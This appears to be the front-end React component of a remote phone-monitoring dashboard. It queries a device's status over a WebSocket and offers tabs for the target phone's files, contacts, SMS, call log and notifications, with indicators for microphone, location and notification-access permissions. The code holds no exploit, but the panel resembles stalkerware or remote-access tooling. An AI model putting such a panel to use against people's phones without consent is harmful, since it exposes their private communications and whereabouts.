import { useContext, useEffect, useState } from "react";
import { Link, NavLink, Outlet, useParams } from "react-router";
import "../css/Sidebar.css";
import "@cubone/react-file-manager/dist/style.css";
import axios from "axios";
import { host } from "../../../../serverConfig.json";
import { Context } from "../../../../context/context";
import { useDevice } from "../../../../context/DeviceContext";
import { WebSocketContext } from "../../../../context/WebSocketProvider";
import { sendWebSocketMessage } from "../../../../context/wsUtils";
import Loading from "../../../../components/loader/Loading";
function DevicePage() {
  const [device, setDevice] = useState(null);
  const [deviceStatus, setDeviceStatus] = useState(null);
  const [navInput, setNavInput] = useState("");
  const [seconds, setSeconds] = useState(0);
  const [loading, setLoading] = useState(true);

  const { selectedLang: language, userInfo } = useContext(Context);

  const { id } = useParams();
  const { state, dispatch } = useDevice();
  const { socketRef } = useContext(WebSocketContext);

  // Helper to send a message at any time
  const sendWS = (data) => {
    if (socketRef?.current) {
      sendWebSocketMessage(socketRef.current, data);
    } else {
      console.warn("WebSocket is not available.", data);
    }
  };

  useEffect(() => {
    if (!id) return;
    // Inline the function to avoid dependency warning
    if (socketRef?.current) {
      sendWebSocketMessage(socketRef.current, {
        token: localStorage.getItem("token"),
        uuid: id,
        status_device_operation: true,
        command: "device:status_device",
      });
    } else {
      console.warn("WebSocket is not available.", {
        token: userInfo,
        uuid: id,
        status_device_operation: true,
        command: "device:status_device",
      });
    }
  }, [id, userInfo, socketRef]);

  const iconMap = [
    { permission: "all_file_access", icon: "fa-folder-open" },
    { permission: "battery_optimize", icon: "fa-battery-full" },
    { permission: "notification", icon: "fa-bell" },
    { permission: "auto_display_in_background", icon: "fa-display" },
    { permission: "contact", icon: "fa-address-book" },
    { permission: "sms", icon: "fa-comment-sms" },
    { permission: "call_log", icon: "fa-phone-volume" },
    { permission: "microphone", icon: "fa-microphone" },
    { permission: "location", icon: "fa-location-dot" },
    { permission: "notification_access", icon: "fa-check-double" },
  ];

  useEffect(() => {
    // Simulate a short loading period (e.g., 500ms)
    const timer = setTimeout(() => setLoading(false), 1000);
    return () => clearTimeout(timer);
  }, []);

  if (loading) {
    return <Loading />;
  }

  if (!id) {
    return (
      <div className="select-device-message">
        <h2>{language?.devices?.please_select_aDevice}</h2>
      </div>
    );
  }

  // Find the current device from myDevices
  const currentDevice = state.myDevices?.find((d) => d.uuid === id);
  // Get permissions object (may be undefined if not found)
  const grantedPermissions = currentDevice?.granted_permission || {};
  const deviceInfo = state.deviceInfo || {};
  const deviceStatusLive = currentDevice;
  return (
    <div className="device">
      <div className="device-header flex">
        <div className="device-info">
          <Link to={``} className="info flex center">
            <i className="center photo fa-solid fa-user"></i>
            <article>
              <h4>
                {language?.devices?.device} {device?.name || "N/A"}
              </h4>
              <p>
                {language?.devices?.id} {id}
              </p>
            </article>
          </Link>

          <div className="input-container flex collumn">
            <input
              onInput={(e) => setNavInput(e.target.value)}
              value={navInput}
              type="text"
              placeholder={language?.devices?.write_something}
            />{" "}
            <div className="icons">
              {iconMap.map(({ permission, icon }) => {
                return (
                  <i
                    key={permission}
                    className={`fa-solid ${icon} ${
                      grantedPermissions[permission] ? "active-icon" : ""
                    }`}
                    title={permission}
                  ></i>
                );
              })}
            </div>
          </div>

          <div className="information flex">
            <div className="info-column flex column">
              <div className="info-div flex center">
                <i
                  className={`fa-solid fa-location-dot ${
                    deviceInfo?.GPS_Status !== "N/A" && "active-icon"
                  }`}
                ></i>
              </div>{" "}
              <div className="info-div flex center">
                <i
                  className={`fa-solid fa-bolt ${
                    deviceStatusLive?.Charging_Status !== "Not Charging" &&
                    "active-icon"
                  } `}
                ></i>
              </div>
            </div>

            <div className="info-column flex column">
              <div className="info-div flex center">
                <i
                  className={`fa-solid fa-wifi ${
                    deviceInfo?.WiFi_Status === "Connected" && "active-icon"
                  }`}
                ></i>
              </div>
              <div className="info-div flex center">
                <i
                  className={`fa-solid fa-mobile  ${
                    deviceStatusLive?.Screen_Lock_Status !== "Locked" &&
                    "active-icon"
                  } `}
                ></i>
              </div>
            </div>

            <div className="info-column flex column">
              <div className="info-div flex center">
                <i
                  className={`fa-brands fa-bluetooth ${
                    deviceInfo?.Bluetooth_Status !== "Off" && "active-icon"
                  }`}
                ></i>
              </div>

              <div className="info-div flex center">
                <p>
                  <i className="fa-solid fa-battery-full rotate-90"></i>

                  {deviceStatusLive?.Battery_Level != null
                    ? `${deviceStatusLive.Battery_Level}%`
                    : "N/A"}
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Tabs Header */}
      <div className="tabs-header flex">
        <NavLink to={`file-manager`} className="tab-button">
          {language?.devices?.file_manager}
        </NavLink>
        <NavLink to={`contacts`} className="tab-button">
          {language?.devices?.contacts}
        </NavLink>
        <NavLink to={`sms`} className="tab-button">
          {language?.devices?.sms}
        </NavLink>
        <NavLink to={`call-log`} className="tab-button">
          {language?.devices?.call_log}
        </NavLink>
        <NavLink to={`notifications`} className="tab-button">
          {language?.devices?.notifications}
        </NavLink>
        <NavLink to={`permissions`} className="tab-button">
          {language?.devices?.permissions}
        </NavLink>
        <NavLink to={`info`} className="tab-button">
          {language?.devices?.info}
        </NavLink>
        <NavLink to={`notes`} className="tab-button">
          {language?.devices?.notes}
        </NavLink>
      </div>

      <div className="tabs-content">
        <Outlet />
      </div>
    </div>
  );
}

export default DevicePage;
